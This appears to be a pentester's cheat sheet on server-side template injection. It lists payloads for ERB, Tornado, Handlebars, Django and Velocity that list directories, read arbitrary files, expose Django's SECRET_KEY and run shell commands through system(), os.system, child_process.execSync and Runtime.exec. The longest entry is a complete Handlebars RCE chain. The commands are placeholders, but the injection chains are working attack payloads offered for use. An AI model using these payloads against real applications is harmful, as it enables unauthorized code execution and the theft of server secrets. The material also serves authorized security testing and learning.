## Template Syntax
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#freemarker---code-execution

ERB
* List all directories
<%= Dir.entries('/') %>
* Read arbitrary files
<%= File.open('/example/arbitrary-file').read %>
* Ruby language
* system() to execute stuff
* ‘’
* Execute stuff
<%= STUFF %>

Tornado
* Python Language
* {{}}
* {% %}
{% import os %}{{os.system("do stuff")}}

HandleBars RCE
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ADD YOUR STUFF');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

Django
* {%+debug+%} will list out all the variables
* Look for the settings object
   	* contains SECRET_KEY attribute

Java
             For example, in the Java-based template engine Velocity, you have access to a ClassTool object called $class. Studying the documentation reveals that you can chain the $class.inspect() method and $class.type  property to obtain references to arbitrary objects. In the past, this  has been exploited to execute shell commands on the target system as  follows:         
                     $class.inspect("java.lang.Runtime").type.getRuntime().exec("bad-stuff-here")         


